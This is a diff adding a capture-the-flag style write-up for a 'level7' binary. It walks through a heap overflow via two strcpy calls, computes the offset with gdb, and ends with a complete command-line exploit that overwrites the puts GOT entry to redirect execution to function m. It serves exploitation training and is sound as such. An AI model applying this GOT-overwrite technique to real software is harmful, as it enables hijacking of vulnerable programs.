@@ -1,0 +1,56 @@
+# Behaviour
+
+First, it malloc 8 bytes
+* it assign the first 4 byte to 0x1
+* it malloc another 8 bytes and assigns the returned address to the last 4 bytes
+
+Then, it does it a second time.
+
+Our pointers look like this
+ptr1
+0x0804a008: 0x00000001 0x0804a018
+ptr2
+0x0804a028: 0x00000002 0x0804a038
+
+We can also notice this
+> strcpy(((char**)ptr1)[1], av[1]);
+> strcpy(((char**)ptr2)[1], av[2]);
+
+What is interesting here is that it uses ((char**)ptr2)[1] (0x0804a038) as destination for av[2]
+What we want to do is overwrite this value (0x0804a038)
+
+From the decompiled asm to C, we can see that:
+* it copies argv[1] to ptr1[1]
+* it copies argv[2] to ptr2[1]
+
+Our goal here is to overwrite ptr2[1] thanks to the second call to strcpy
+The address stored at ptr1[1] is 0x0804a018
+The address of ptr2 is 0x0804a028
+0x0804a028 - 0x0804a018 = 16 (0x10)
+We also need to overwrite the first 4 bytes at this address
+20 (0x14) is needed to reach our value to overwrite
+
+> ./level7 $(python -c 'print "A" * 0x14')
+
+There is this line we can leverage
+>  puts("~~");
+
+We will find its GOT address et overwrite it with the `m` function address
+>   0x080485f7 <+214>:           call   0x8048400 <puts@plt>
+> (gdb) x/4i 0x8048400
+>   0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
+> (gdb) x/4i 0x8049928
+>   0x8049928 <puts@got.plt>:    push   es
+
+So `puts@got.plt = 0x8049928` is our destination address for 2nd strcpy
+> ./level7 $(python -c 'print "A" * 0x14 + "\x08\x04\x99\x28"[::-1]')
+
+But we need to write to it the `m` function address
+Let's check `m` address
+> i functions
+> 0x080484f4 m
+
+This is our second parameter
+We can then build our parameters as it uses 2 arguments from `argv`
+
+./level7 $(python -c 'print "A" * 0x14 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
